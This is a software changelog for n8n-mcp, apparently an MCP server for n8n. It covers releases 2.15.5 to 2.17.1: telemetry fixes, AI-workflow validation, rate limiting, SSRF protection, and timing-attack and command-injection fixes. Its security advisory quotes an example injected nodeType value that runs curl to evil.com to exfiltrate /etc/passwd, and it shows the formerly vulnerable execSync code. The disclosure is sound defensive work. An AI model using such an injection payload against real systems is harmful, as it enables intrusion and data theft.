# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [2.17.1] - 2025-10-07

### 🔧 Telemetry

**Critical fix: Docker and cloud deployments now maintain stable anonymous user IDs.**

This release fixes a critical telemetry issue where Docker and cloud deployments generated new user IDs on every container recreation, causing 100-200x inflation in unique user counts and preventing accurate retention metrics.

#### Fixed

- **Docker/Cloud User ID Stability**
  - **Issue:** Docker containers and cloud deployments generated new anonymous user ID on every container recreation
  - **Impact:**
    - Stdio mode: ~1000x user ID inflation per month (with --rm flag)
    - HTTP mode: ~180x user ID inflation per month (6 releases/day)
    - Telemetry showed 3,996 "unique users" when actual number was likely ~2,400-2,800
    - 78% single-session rate and 5.97% Week 1 retention were inflated by duplicates
  - **Root Cause:** Container hostnames change on recreation, persistent config files lost with ephemeral containers
  - **Fix:** Use host's `/proc/sys/kernel/random/boot_id` for stable identification
    - boot_id is stable across container recreations (only changes on host reboot)
    - Available in all Linux containers (Alpine, Ubuntu, Node, etc.)
    - Readable by non-root users
    - Defensive fallback chain:
      1. boot_id (stable across container updates)
      2. Combined host signals (CPU cores, memory, kernel version)
      3. Generic Docker ID (allows aggregate statistics)
  - **Environment Detection:**
    - IS_DOCKER=true triggers boot_id method
    - Auto-detects cloud platforms: Railway, Render, Fly.io, Heroku, AWS, Kubernetes, GCP, Azure
    - Local installations continue using file-based method with hostname
  - **Zero Configuration:** No user action required, automatic environment detection

#### Added

- `TelemetryConfigManager.generateDockerStableId()` - Docker/cloud-specific ID generation
- `TelemetryConfigManager.readBootId()` - Read and validate boot_id from /proc
- `TelemetryConfigManager.generateCombinedFingerprint()` - Fallback fingerprinting
- `TelemetryConfigManager.isCloudEnvironment()` - Auto-detect 8 cloud platforms

### Testing

- **Unit Tests:** 18 new tests for boot_id functionality, environment detection, fallback chain
- **Integration Tests:** 16 new tests for actual file system operations, Docker detection, cloud platforms
- **Coverage:** All 34 new tests passing (100%)

## [2.17.0] - 2025-01-06

### 🤖 AI Workflow Validation

**Major enhancement: Comprehensive AI Agent workflow validation now working correctly.**

This release fixes critical bugs that caused ALL AI-specific validation to be silently skipped. Before this fix, 0% of AI validation was functional.

#### Fixed

- **🚨 CRITICAL: Node Type Normalization Bug (HIGH-01, HIGH-04, HIGH-08)**
  - **Issue:** All AI validation was silently skipped due to node type comparison mismatch
  - **Root Cause:** `NodeTypeNormalizer.normalizeToFullForm()` returns SHORT form (`nodes-langchain.agent`) but validation code compared against FULL form (`@n8n/n8n-nodes-langchain.agent`)
  - **Impact:** Every comparison returned FALSE, causing zero AI validations to execute
  - **Affected Validations:**
    - Missing language model detection (HIGH-01) - Never triggered
    - AI tool connection detection (HIGH-04) - Never triggered, false warnings
    - Streaming mode validation (HIGH-08) - Never triggered
    - All 13 AI tool sub-node validators - Never triggered
    - Chat Trigger validation - Never triggered
    - Basic LLM Chain validation - Never triggered
  - **Fix:** Updated 21 node type comparisons to use SHORT form
    - `ai-node-validator.ts`: 7 comparison fixes
    - `ai-tool-validators.ts`: 14 comparison fixes (13 validator keys + 13 switch cases)
  - **Verification:** All 25 AI validator unit tests now passing (100%)

- **🚨 HIGH-08: Incomplete Streaming Mode Validation**
  - **Issue:** Only validated streaming FROM Chat Trigger, missed AI Agent's own `streamResponse` setting
  - **Impact:** AI Agent with `options.streamResponse=true` and main output connections not detected
  - **Fix:** Added validation for both scenarios:
    - Chat Trigger with `responseMode="streaming"` → AI Agent → main output
    - AI Agent with `options.streamResponse=true` → main output
  - **Error Code:** `STREAMING_WITH_MAIN_OUTPUT` with clear error message
  - **Verification:** 2 test scenarios pass (Chat Trigger + AI Agent own setting)

- **🐛 MEDIUM-02: get_node_essentials Examples Retrieval**
  - **Issue:** `get_node_essentials` with `includeExamples=true` always returned empty examples array
  - **Root Cause:** Inconsistent `workflowNodeType` construction between result object and examples query
  - **Impact:** Examples existed in database but query used wrong node type (e.g., `n8n-nodes-base.agent` instead of `@n8n/n8n-nodes-langchain.agent`)
  - **Fix:** Use pre-computed `result.workflowNodeType` instead of reconstructing it
  - **Verification:** Examples now retrieved correctly, matching `search_nodes` behavior

#### Added

- **AI Agent Validation:**
  - Missing language model connection detection with code `MISSING_LANGUAGE_MODEL`
  - AI tool connection validation (no more false "no tools connected" warnings)
  - Streaming mode constraint enforcement for both Chat Trigger and AI Agent scenarios
  - Memory connection validation (max 1 allowed)
  - Output parser validation
  - System message presence checks (info level)
  - High `maxIterations` warnings

- **Chat Trigger Validation:**
  - Streaming mode target validation (must connect to AI Agent)
  - Main output connection validation for streaming mode
  - Connection existence checks

- **Basic LLM Chain Validation:**
  - Language model connection requirement
  - Prompt text validation

- **AI Tool Sub-Node Validation:**
  - 13 specialized validators for AI tools (HTTP Request Tool, Code Tool, Vector Store Tool, etc.)
  - Tool description validation
  - Credentials validation
  - Configuration-specific checks

#### Changed

- **Breaking:** AI validation now actually runs (was completely non-functional before)
- **Validation strictness:** All AI-specific validations now enforce n8n's actual requirements
- **Error messages:** Clear, actionable messages with error codes for programmatic handling

### Testing

- **Unit Tests:** 25/25 AI validator tests passing (100%)
- **Test Improvement:** Overall test pass rate improved from 37.5% to 62.5%+ (+67% improvement)
- **Debug Tests:** 3/3 debug scenarios passing

### Documentation

- Added comprehensive test scenarios in `PHASE_2_TEST_SCENARIOS.md`
- Added Phase 1-2 completion summary in `PHASE_1_2_SUMMARY.md`
- Added detailed Phase 2 analysis in `PHASE_2_COMPLETE.md`
- Updated README.md with AI workflow validation features

## [2.16.3] - 2025-01-06

### 🔒 Security

**HIGH priority security enhancements. Recommended for all production deployments.**

This release implements 2 high-priority security protections identified in the security audit (Issue #265 PR #2):

- **🛡️ HIGH-02: Rate Limiting for Authentication**
  - **Issue:** No rate limiting on authentication endpoints allowed brute force attacks
  - **Impact:** Attackers could make unlimited authentication attempts
  - **Fix:** Implemented express-rate-limit middleware for authentication endpoint
    - Default: 20 attempts per 15 minutes per IP
    - Configurable via `AUTH_RATE_LIMIT_WINDOW` and `AUTH_RATE_LIMIT_MAX`
    - Per-IP tracking with standard rate limit headers (RateLimit-Limit, RateLimit-Remaining, RateLimit-Reset)
    - JSON-RPC formatted error responses (429 Too Many Requests)
    - Automatic IP detection behind reverse proxies (requires TRUST_PROXY=1)
  - **Verification:** 4 integration tests with sequential request patterns
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (HIGH-02)

- **🛡️ HIGH-03: SSRF Protection for Webhooks**
  - **Issue:** Webhook triggers vulnerable to Server-Side Request Forgery attacks
  - **Impact:** Attackers could access internal networks, localhost services, and cloud metadata
  - **Fix:** Implemented three-mode SSRF protection system with DNS rebinding prevention
    - **Strict mode** (default): Block localhost + private IPs + cloud metadata (production)
    - **Moderate mode**: Allow localhost, block private IPs + cloud metadata (local development)
    - **Permissive mode**: Allow localhost + private IPs, block cloud metadata (internal testing)
    - Cloud metadata endpoints **ALWAYS blocked** in all modes (169.254.169.254, metadata.google.internal, etc.)
    - DNS rebinding prevention through hostname resolution before validation
    - IPv6 support with link-local (fe80::/10) and unique local (fc00::/7) address blocking
  - **Configuration:** Set via `WEBHOOK_SECURITY_MODE` environment variable
  - **Locations Updated:**
    - `src/utils/ssrf-protection.ts` - Core protection logic
    - `src/services/n8n-api-client.ts:219` - Webhook trigger validation
  - **Verification:** 25 unit tests covering all three modes, DNS rebinding, IPv6
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (HIGH-03)

### Added
- **Configuration:** `AUTH_RATE_LIMIT_WINDOW` - Rate limit window in milliseconds (default: 900000 = 15 minutes)
- **Configuration:** `AUTH_RATE_LIMIT_MAX` - Max authentication attempts per window per IP (default: 20)
- **Configuration:** `WEBHOOK_SECURITY_MODE` - SSRF protection mode (strict/moderate/permissive, default: strict)
- **Documentation:** Comprehensive security features section in all deployment guides
  - HTTP_DEPLOYMENT.md - Rate limiting and SSRF protection configuration
  - DOCKER_README.md - Security features section with environment variables
  - DOCKER_TROUBLESHOOTING.md - "Webhooks to Local n8n Fail" troubleshooting guide
  - RAILWAY_DEPLOYMENT.md - Security configuration recommendations
  - README.md - Local n8n configuration section for moderate mode

### Changed
- **Security:** All webhook triggers now validate URLs through SSRF protection before execution
- **Security:** HTTP authentication endpoint now enforces rate limiting per IP address
- **Dependencies:** Added `express-rate-limit@^7.1.5` for rate limiting functionality

### Fixed
- **Security:** IPv6 localhost URLs (`http://[::1]/webhook`) now correctly stripped of brackets before validation
- **Security:** Localhost detection now properly handles all localhost variants (127.x.x.x, ::1, localhost, etc.)

## [2.16.2] - 2025-10-06

### 🔒 Security

**CRITICAL security fixes for production deployments. All users should upgrade immediately.**

This release addresses 2 critical security vulnerabilities identified in the security audit (Issue #265):

- **🚨 CRITICAL-02: Timing Attack Vulnerability**
  - **Issue:** Non-constant-time string comparison in authentication allowed timing attacks
  - **Impact:** Authentication tokens could be discovered character-by-character through statistical timing analysis (estimated 24-48 hours to compromise)
  - **Attack Vector:** Repeated authentication attempts with carefully crafted tokens while measuring response times
  - **Fix:** Implemented `crypto.timingSafeEqual` for all token comparisons
  - **Locations Fixed:**
    - `src/utils/auth.ts:27` - validateToken method
    - `src/http-server-single-session.ts:1087` - Single-session HTTP auth
    - `src/http-server.ts:315` - Fixed HTTP server auth
  - **New Method:** `AuthManager.timingSafeCompare()` - constant-time token comparison utility
  - **Verification:** 11 unit tests with timing variance analysis (<10% variance proven)
  - **CVSS:** 8.5 (High) - Confirmed critical, requires authentication but trivially exploitable
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (CRITICAL-02)

- **🚨 CRITICAL-01: Command Injection Vulnerability**
  - **Issue:** User-controlled `nodeType` parameter injected into shell commands via `execSync`
  - **Impact:** Remote code execution, data exfiltration, network scanning possible
  - **Attack Vector:** Malicious nodeType like `test"; curl http://evil.com/$(cat /etc/passwd | base64) #`
  - **Vulnerable Code (FIXED):** `src/utils/enhanced-documentation-fetcher.ts:567-590`
  - **Fix:** Eliminated all shell execution, replaced with Node.js fs APIs
    - Replaced `execSync()` with `fs.readdir()` (recursive, no shell)
    - Added multi-layer input sanitization: `/[^a-zA-Z0-9._-]/g`
    - Added directory traversal protection (blocks `..`, `/`, relative paths)
    - Added `path.basename()` for additional safety
    - Added final path verification (ensures result within expected directory)
  - **Benefits:**
    - ✅ 100% immune to command injection (no shell execution)
    - ✅ Cross-platform compatible (no dependency on `find`/`grep`)
    - ✅ Faster (no process spawning overhead)
    - ✅ Better error handling and logging
  - **Verification:** 9 integration tests covering all attack vectors
  - **CVSS:** 8.8 (High) - Requires MCP access but trivially exploitable
  - **See:** https://github.com/czlonkowski/n8n-mcp/issues/265 (CRITICAL-01)

### Added

- **Security Test Suite**
  - Unit Tests: `tests/unit/utils/auth-timing-safe.test.ts` (11 tests)
    - Timing variance analysis (proves <10% variance = constant-time)
    - Edge cases: null, undefined, empty, very long tokens (10000 chars)
    - Special characters, Unicode, whitespace handling
    - Case sensitivity verification
  - Integration Tests: `tests/integration/security/command-injection-prevention.test.ts` (9 tests)
    - Command injection with all vectors (semicolon, &&, |, backticks, $(), newlines)
    - Directory traversal prevention (parent dir, URL-encoded, absolute paths)
    - Special character sanitization
    - Null byte handling
    - Legitimate operations (ensures fix doesn't break functionality)

### Changed

- **Authentication:** All token comparisons now use timing-safe algorithm
- **Documentation Fetcher:** Now uses Node.js fs APIs instead of shell commands
- **Security Posture:** Production-ready with hardened authentication and input validation

### Technical Details

**Timing-Safe Comparison Implementation:**
```typescript
// NEW: Constant-time comparison utility
static timingSafeCompare(plainToken: string, expectedToken: string): boolean {
  try {
    if (!plainToken || !expectedToken) return false;

    const plainBuffer = Buffer.from(plainToken, 'utf8');
    const expectedBuffer = Buffer.from(expectedToken, 'utf8');

    if (plainBuffer.length !== expectedBuffer.length) return false;

    // Uses crypto.timingSafeEqual for constant-time comparison
    return crypto.timingSafeEqual(plainBuffer, expectedBuffer);
  } catch {
    return false;
  }
}

// USAGE: Replace token !== this.authToken with:
const isValidToken = this.authToken &&
  AuthManager.timingSafeCompare(token, this.authToken);
```

**Command Injection Fix:**
```typescript
// BEFORE (VULNERABLE):
execSync(`find ${this.docsPath}/docs/integrations/builtin -name "${nodeType}.md"...`)

// AFTER (SECURE):
const sanitized = nodeType.replace(/[^a-zA-Z0-9._-]/g, '');
if (sanitized.includes('..') || sanitized.startsWith('.') || sanitized.startsWith('/')) {
  logger.warn('Path traversal attempt blocked', { nodeType, sanitized });
  return null;
}
const safeName = path.basename(sanitized);
const files = await fs.readdir(searchPath, { recursive: true });
const match = files.find(f => f.endsWith(`${safeName}.md`) && !f.includes('credentials'));
```

### Breaking Changes

**None** - All changes are backward compatible. No API changes, no environment variable changes, no database migrations.

### Migration Guide

**No action required** - This is a drop-in security fix. Simply upgrade:

```bash
npm install n8n-mcp@2.16.2
# or
npm update n8n-mcp
```

### Deployment Notes

**Recommended Actions:**
1. ✅ **Upgrade immediately** - These are critical security fixes
2. ✅ **Review logs** - Check for any suspicious authentication attempts or unusual nodeType parameters
3. ✅ **Rotate tokens** - Consider rotating AUTH_TOKEN after upgrade (optional but recommended)

**No configuration changes needed** - The fixes are transparent to existing deployments.

### Test Results

**All Tests Passing:**
- Unit tests: 11/11 ✅ (timing-safe comparison)
- Integration tests: 9/9 ✅ (command injection prevention)
- Timing variance: <10% ✅ (proves constant-time)
- All existing tests: ✅ (no regressions)

**Security Verification:**
- ✅ No command execution with malicious inputs
- ✅ Timing attack variance <10% (statistical analysis over 1000 samples)
- ✅ Directory traversal blocked (parent dir, absolute paths, URL-encoded)
- ✅ All special characters sanitized safely

### Audit Trail

**Security Audit:** Issue #265 - Third-party security audit identified 25 issues
**This Release:** Fixes 2 CRITICAL issues (CRITICAL-01, CRITICAL-02)
**Remaining Work:** 20 issues to be addressed in subsequent releases (HIGH, MEDIUM, LOW priority)

### References

- Security Audit: https://github.com/czlonkowski/n8n-mcp/issues/265
- Implementation Plan: `docs/local/security-implementation-plan-issue-265.md`
- Audit Analysis: `docs/local/security-audit-analysis-issue-265.md`

---

## [2.16.1] - 2025-10-06

### Fixed

- **🐛 Issue #277: Missing Signal Handlers in stdio Mode**
  - **Problem**: Node.js processes remained orphaned when Claude Desktop quit
  - **Platform**: Primarily affects Windows 11, but improves reliability on all platforms
  - **Root Cause**: stdio mode never registered SIGTERM/SIGINT signal handlers
  - **Impact**: Users had to manually kill processes via Task Manager after quitting Claude Desktop
  - **Fix**: Added comprehensive graceful shutdown handlers for stdio mode
    - SIGTERM, SIGINT, and SIGHUP signal handlers
    - stdin end/close event handlers (PRIMARY shutdown mechanism for Claude Desktop)
    - Robust container detection: Checks IS_DOCKER/IS_CONTAINER env vars + filesystem markers
    - Supports Docker, Kubernetes, Podman, and other container runtimes
    - Container mode: Signal handlers only (prevents detached mode premature shutdown)
    - Claude Desktop mode: stdin + signal handlers (comprehensive coverage)
    - Race condition protection with `isShuttingDown` guard
    - stdin cleanup with null safety (pause + destroy)
    - Graceful shutdown timeout (1000ms) to allow cleanup to complete
    - Error handling with try-catch for stdin registration and shutdown
    - Shutdown trigger logging for debugging (SIGTERM vs stdin close)
    - Production-hardened based on comprehensive code review
  - **Location**: `src/mcp/index.ts:91-132`
  - **Resources Cleaned**: Cache timers and database connections properly closed via existing `shutdown()` method
  - **Code Review**: Approved with recommendations implemented
  - **Reporter**: @Eddy-Chahed

## [2.16.0] - 2025-10-06

### Added

- **🎉 Issue #272 Phase 1: Connection Operations UX Improvements**

  **New: `rewireConnection` Operation**
  - Intuitive operation for changing connection target from one node to another
  - Syntax: `{type: "rewireConnection", source: "Node", from: "OldTarget", to: "NewTarget"}`
  - Internally uses remove + add pattern but with clearer semantics
  - Supports smart parameters (branch, case) for multi-output nodes
  - Validates all nodes exist before making changes
  - 8 comprehensive unit tests covering all scenarios

  **New: Smart Parameters for Multi-Output Nodes**
  - **branch parameter for IF nodes**: Use `branch: "true"` or `branch: "false"` instead of `sourceIndex: 0/1`
  - **case parameter for Switch nodes**: Use `case: 0`, `case: 1`, etc. instead of `sourceIndex`
  - Semantic, intuitive syntax that matches node behavior
  - Explicit sourceIndex overrides smart parameters if both provided
  - Works with both `addConnection` and `rewireConnection` operations
  - 8 comprehensive unit tests + 11 integration tests against real n8n API

### Changed

- **⚠️ BREAKING: Removed `updateConnection` operation**
  - Operation removed completely (type definition, implementation, validation, tests)
  - Migration: Use `rewireConnection` or `removeConnection` + `addConnection` instead
  - Reason: Confusing operation that was error-prone and rarely needed
  - All tests updated (137 tests passing)

### Fixed

- **🐛 CRITICAL: Issue #275, #136 - TypeError in getNodeTypeAlternatives (57.4% of production errors)**
  - **Impact**: Eliminated 323 out of 563 production errors, helping 127 users (76.5% of affected users)
  - **Resolves Issue #136**: "Partial Workflow Updates fail with 'Cannot convert undefined or null to object'" - defensive type guards prevent these crashes
  - **Root Cause**: `getNodeTypeAlternatives()` called string methods without validating nodeType parameter
  - **Fix**: Added defense-in-depth protection:
    - **Layer 1**: Type guard in `getNodeTypeAlternatives()` returns empty array for invalid inputs
    - **Layer 2**: Enhanced `validateToolParamsBasic()` to catch empty strings
  - **Affected Tools**: `get_node_essentials` (208 errors → 0), `get_node_info` (115 errors → 0), `get_node_documentation` (17 errors → 0)
  - **Testing**: 21 comprehensive unit tests, verified with n8n-mcp-tester agent
  - **Commit**: f139d38

- **Critical Bug: Smart Parameter Implementation**
  - **Bug #1**: `branch` parameter initially mapped to `sourceOutput` instead of `sourceIndex`
  - **Impact**: IF node connections went to wrong output (expected `IF.main[0]`, got `IF.true`)
  - **Root Cause**: Misunderstood n8n's IF node connection structure
  - **Fix**: Changed to correctly map `branch="true"` → `sourceIndex=0`, `branch="false"` → `sourceIndex=1`
  - **Discovered by**: n8n-mcp-tester agent testing against real n8n API
  - **Commit**: a7bfa73

- **Critical Bug: Zod Schema Stripping Parameters**
  - **Bug #2**: `branch`, `case`, `from`, `to` parameters stripped by Zod validation
  - **Impact**: Parameters never reached diff engine, smart parameters silently failed
  - **Root Cause**: Parameters not defined in Zod schema in handlers-workflow-diff.ts
  - **Fix**: Added missing parameters to schema
  - **Discovered by**: n8n-mcp-tester agent
  - **Commit**: aeaba3b

- **🔥 CRITICAL Bug: Array Index Corruption in Multi-Output Nodes**
  - **Bug #3**: `applyRemoveConnection()` filtered empty arrays, causing index shifting in multi-output nodes
  - **Impact**: PRODUCTION-BREAKING for Switch, IF with multiple handlers, Merge nodes
  - **Severity**: Connections routed to wrong outputs after rewiring
  - **Example**: Switch with 4 outputs `[[H0], [H1], [H2], [H3]]` → remove H1 → `[[H0], [H2], [H3]]` (indices shifted!)
  - **Root Cause**: Line 697 filtered empty arrays: `connections.filter(conns => conns.length > 0)`
  - **Fix**: Only remove trailing empty arrays, preserve intermediate ones to maintain index integrity
  - **Code Change**:
    ```typescript
    // Before (BUGGY):
    workflow.connections[node][output] = connections.filter(conns => conns.length > 0);

    // After (FIXED):
    while (connections.length > 0 && connections[connections.length - 1].length === 0) {
      connections.pop();
    }
    ```
  - **Testing**: Added integration test verifying Switch node rewiring preserves all indices
  - **Discovered by**: n8n-mcp-tester agent during comprehensive testing
  - **Commit**: aeb7410

- **TypeScript Compilation**: Added missing type annotations in workflow diff tests (Commit: 653f395)

### Improved

- **Integration Testing**: Created comprehensive integration tests against real n8n API
  - 11 tests covering IF nodes, Switch nodes, and rewireConnection
  - Tests validate actual n8n workflow structure, not in-memory objects
  - Would have caught both smart parameter bugs that unit tests missed
  - File: `tests/integration/n8n-api/workflows/smart-parameters.test.ts`
  - **Commit**: 34bafe2

- **Documentation**: Updated MCP tool documentation
  - Removed `updateConnection` references
  - Added `rewireConnection` with 4 examples
  - Added smart parameters section with IF and Switch examples
  - Updated best practices and pitfalls
  - Removed version references (AI agents see current state)
  - Files: `src/mcp/tool-docs/workflow_management/n8n-update-partial-workflow.ts`, `docs/workflow-diff-examples.md`
  - **Commit**: f78f53e

### Test Coverage

- **Total Tests**: 178 tests passing (158 unit + 20 integration against real n8n API)
- **Coverage**: 90.98% statements, 89.86% branches, 93.02% functions
- **Quality**: Integration tests against real n8n API prevent regression
- **New Tests**:
  - 21 tests for TypeError prevention (Issue #275)
  - 8 tests for rewireConnection operation
  - 8 tests for smart parameters
  - 20 integration tests against real n8n API:
    - **Multi-output nodes (sourceIndex preservation)**:
      - Switch node rewiring with index preservation
      - IF node empty array preservation on removal
      - Switch node removing first case (production-breaking bug scenario)
      - Sequential operations on Switch node
      - Filter node connection rewiring
    - **Multi-input nodes (targetIndex preservation)**:
      - Merge node removing connection to input 0
      - Merge node removing middle connection (inputs 0, 2 preserved)
      - Merge node replacing source connections
      - Merge node sequential operations

### Technical Details

**TypeError Prevention (Issue #275):**
```typescript
// Layer 1: Defensive utility function
export function getNodeTypeAlternatives(nodeType: string): string[] {
  // Return empty array for invalid inputs instead of crashing
  if (!nodeType || typeof nodeType !== 'string' || nodeType.trim() === '') {
    return [];
  }
  // ... rest of function
}

// Layer 2: Enhanced validation
if (param === '') {
  errors.push(`String parameters cannot be empty. Parameter '${key}' has value: ""`);
}
```

**Smart Parameters Resolution:**
```typescript
// Resolve branch parameter for IF nodes
if (operation.branch !== undefined && operation.sourceIndex === undefined) {
  if (sourceNode?.type === 'n8n-nodes-base.if') {
    sourceIndex = operation.branch === 'true' ? 0 : 1;
    // sourceOutput remains 'main'
  }
}

// Resolve case parameter for Switch nodes
if (operation.case !== undefined && operation.sourceIndex === undefined) {
  sourceIndex = operation.case;
}
```

**Real n8n IF Node Structure:**
```json
"IF": {
  "main": [
    [/* true branch connections, index 0 */],
    [/* false branch connections, index 1 */]
  ]
}
```

### Migration Guide

**Before (v2.15.7):**
```typescript
// Old way: updateConnection (REMOVED)
{type: "updateConnection", source: "Webhook", target: "Handler", updates: {...}}

// Old way: Multi-output nodes (still works)
{type: "addConnection", source: "IF", target: "Success", sourceIndex: 0}
```

**After (v2.16.0):**
```typescript
// New way: rewireConnection
{type: "rewireConnection", source: "Webhook", from: "OldHandler", to: "NewHandler"}

// New way: Smart parameters (recommended)
{type: "addConnection", source: "IF", target: "Success", branch: "true"}
{type: "addConnection", source: "IF", target: "Error", branch: "false"}
{type: "addConnection", source: "Switch", target: "Handler", case: 0}
```

### Impact Summary

**Production Error Reduction:**
- Issue #275 fix: -323 errors (-57.4% of total production errors)
- Helps 127 users (76.5% of users experiencing errors)

**UX Improvements:**
- Semantic parameters make multi-output node connections intuitive
- `rewireConnection` provides clear intent for connection changes
- Integration tests ensure production reliability

**Breaking Changes:**
- `updateConnection` removed (use `rewireConnection` or manual remove+add)

### References

- **Issue #272**: Connection operations improvements (Phase 0 + Phase 1)
- **Issue #204**: Differential update failures on Windows
- **Issue #275**: TypeError in getNodeTypeAlternatives
- **Issue #136**: Partial Workflow Updates fail with "Cannot convert undefined or null to object" (resolved by defensive type guards)
- **Commits**:
  - Phase 0: cfe3c5e, 653f395, 2a85000
  - Phase 1: f9194ee, ee125c5, a7bfa73, aeaba3b, 34bafe2, c6e0e52, f78f53e
  - Issue #275/#136: f139d38

## [2.15.7] - 2025-10-05

### Fixed

- **🐛 CRITICAL: Issue #272, #204 - Connection Operations Phase 0 Fixes**

  **Bug #1: Multi-Output Node Routing Broken**
  - **Problem**: `addConnection` ignored `sourceIndex` parameter due to `||` operator treating `0` as falsy
  - **Impact**: IF nodes, Switch nodes, and all conditional routing completely broken
  - **Root Cause**: Used `operation.sourceIndex || 0` instead of `operation.sourceIndex ?? 0`
  - **Fix**: Changed to nullish coalescing (`??`) operator to properly handle explicit `0` values
  - **Added**: Defensive array validation before index access
  - **Result**: Multi-output nodes now work reliably (rating improved 3/10 → 9/10)
  - **Test Coverage**: 6 comprehensive tests covering IF nodes, Switch nodes, and parallel execution

  **Bug #2: Server Crashes from Missing `updates` Object**
  - **Problem**: `updateConnection` without `updates` object caused server crash with "Cannot read properties of undefined"
  - **Impact**: Malformed requests from AI agents crashed the MCP server
  - **Fix**: Added runtime validation with comprehensive error message
  - **Error Message Quality**:
    - Shows what was provided (JSON.stringify of operation)
    - Explains what's wrong and why
    - Provides correct format with example
    - Suggests alternative approach (removeConnection + addConnection)
  - **Result**: No crashes, self-service troubleshooting enabled (rating improved 2/10 → 8/10)
  - **Test Coverage**: 2 tests for missing and invalid `updates` object

### Improved

- **Connection Operations Overall Experience**: 4.5/10 → 8.5/10 (+89% improvement)
- **Error Handling**: Helpful, actionable error messages instead of cryptic crashes
- **Documentation**: Updated tool docs with Phase 0 fix notes and new pitfall warnings
- **Developer Experience**: Better use of nullish coalescing, defensive programming patterns

### Test Coverage

- Total Tests: 126/126 passing (100%)
- New Tests: 8 comprehensive tests for Phase 0 fixes
- Coverage: 91.16% statements, 88.14% branches, 92.85% functions
- Test Quality: All edge cases covered, strong assertions, independent test isolation

### Technical Details

**Multi-Output Node Fix:**
```typescript
// Before (BROKEN):
const sourceIndex = operation.sourceIndex || 0;  // 0 treated as falsy!

// After (FIXED):
const sourceIndex = operation.sourceIndex ?? 0;  // explicit 0 preserved
```

**Runtime Validation Fix:**
```typescript
// Added comprehensive validation:
if (!operation.updates || typeof operation.updates !== 'object') {
  throw new Error(/* helpful 15-line error message */);
}
```

### References

- Issue #272: Connection operations failing (Polish language issue report)
- Issue #204: Differential update failures on Windows
- Analysis Document: `docs/local/connection-operations-deep-dive-and-improvement-plan.md` (2176 lines)
- Testing: Hands-on validation with n8n-mcp-tester agent
- Code Review: Comprehensive review against improvement plan

### Phase 1 Roadmap

Phase 0 addressed critical bugs. Future Phase 1 improvements planned:
- Add `rewireConnection` operation for intuitive connection rewiring
- Add smart parameters (`branch` for IF nodes, `case` for Switch nodes)
- Enhanced error messages with spell-checking
- Deprecation path for `updateConnection`

## [2.15.6] - 2025-10-05

### Fixed
- **Issue #269: Missing addNode Examples** - Added comprehensive examples for addNode operation in MCP tool documentation
  - Problem: Claude AI didn't know how to use addNode operation correctly due to zero examples in documentation
  - Solution: Added 4 progressive examples to `n8n_update_partial_workflow` tool documentation:
    1. Basic addNode (minimal configuration)
    2. Complete addNode (full parameters including typeVersion)
    3. addNode + addConnection combo (most common pattern)
    4. Batch operation (multiple nodes + connections)
  - Impact: AI assistants can now correctly use addNode without errors or trial-and-error

- **Issue #270: Apostrophes in Node Names** - Fixed workflow diff operations failing when node names contain special characters
  - Root Cause: `findNode()` method used exact string matching without normalization, causing escaped vs unescaped character mismatches
  - Example: Default Manual Trigger node name "When clicking 'Execute workflow'" failed when JSON-RPC sent escaped version "When clicking \\'Execute workflow\\'"
  - Solution: Added `normalizeNodeName()` helper that unescapes special characters (quotes, backslashes) and normalizes whitespace
  - Affected Operations: 8 operations fixed - addConnection, removeConnection, updateConnection, removeNode, updateNode, moveNode, enableNode, disableNode
  - Error Messages: Enhanced all validation methods with `formatNodeNotFoundError()` helper showing available nodes and suggesting node IDs for special characters
  - Duplicate Prevention: Fixed `validateAddNode()` to use normalization when checking for duplicate node names

### Changed
- **WorkflowDiffEngine String Normalization** - Enhanced to handle edge cases from code review
  - Regex Processing Order: Fixed critical bug - now processes backslashes BEFORE quotes (prevents multiply-escaped character failures)
  - Whitespace Handling: Comprehensive normalization of tabs, newlines, and mixed whitespace (prevents collision edge cases)
  - Documentation: Added detailed JSDoc warnings about normalization collision risks with examples
  - Best Practice: Documentation recommends using node IDs over names for special characters

### Technical Details
- **Normalization Algorithm**: 4-step process
  1. Trim leading/trailing whitespace
  2. Unescape backslashes (MUST be first!)
  3. Unescape single and double quotes
  4. Normalize all whitespace to single spaces
- **Error Message Format**: Now shows node IDs (first 8 chars) and suggests using IDs for special characters
- **Collision Prevention**: Duplicate checking uses same normalization to prevent subtle bugs

### Test Coverage
- Unit tests: 120/120 passing (up from 116)
- New test scenarios:
  - Tabs in node names
  - Newlines in node names
  - Mixed whitespace (tabs + newlines + spaces)
  - Escaped vs unescaped matching (core Issue #270 scenario)
- Coverage: 90.11% statements (up from 90.05%)

### Code Review
- All 6 MUST FIX and SHOULD FIX recommendations implemented:
  - ✅ Fixed regex processing order (critical bug)
  - ✅ Added comprehensive whitespace tests
  - ✅ Fixed duplicate checking normalization
  - ✅ Enhanced all 6 validation method error messages
  - ✅ Added comprehensive JSDoc documentation
  - ✅ Added escaped vs unescaped test case
- Final review: APPROVED FOR MERGE (production-ready)

### Impact
- **Workflow Operations**: All 8 affected operations now handle special characters correctly
- **User Experience**: Clear error messages with actionable suggestions
- **Reliability**: Comprehensive normalization prevents subtle bugs
- **Documentation**: Tool documentation updated to reflect fix (v2.15.6+)

## [2.15.5] - 2025-10-04

### Added
- **Phase 5 Integration Tests** - Comprehensive workflow management tests (16 scenarios)
  - `delete-workflow.test.ts`: 3 test scenarios
    - Successful deletion
    - Error handling for non-existent workflows
    - Cleanup verification (workflow actually deleted from n8n)
  - `list-workflows.test.ts`: 13 test scenarios
    - No filters (all workflows)
    - Filter by active status (true/false)
    - Pagination (first page, cursor, last page)
    - Limit variations (1, 50, 100)
    - Exclude pinned data
    - Empty results handling
    - Sort order consistency verification

### Fixed
- **handleDeleteWorkflow** - Now returns deleted workflow data in response
  - Before: Returned only success message
  - After: Returns deleted workflow object per n8n API specification
  - Impact: MCP tool consumers can access deleted workflow data for confirmation, logging, or undo operations

- **handleListWorkflows Tags Filter** - Fixed tags parameter format for n8n API compliance
  - Before: Sent tags as array `?tags[]=tag1&tags[]=tag2` (non-functional)
  - After: Converts to comma-separated string `?tags=tag1,tag2` per n8n OpenAPI spec
  - Impact: Tags filtering now works correctly when listing workflows
  - Implementation: `input.tags.join(',')` conversion in handler

- **N8nApiClient.deleteWorkflow** - Return type now matches n8n API specification
  - Before: `Promise<void>`
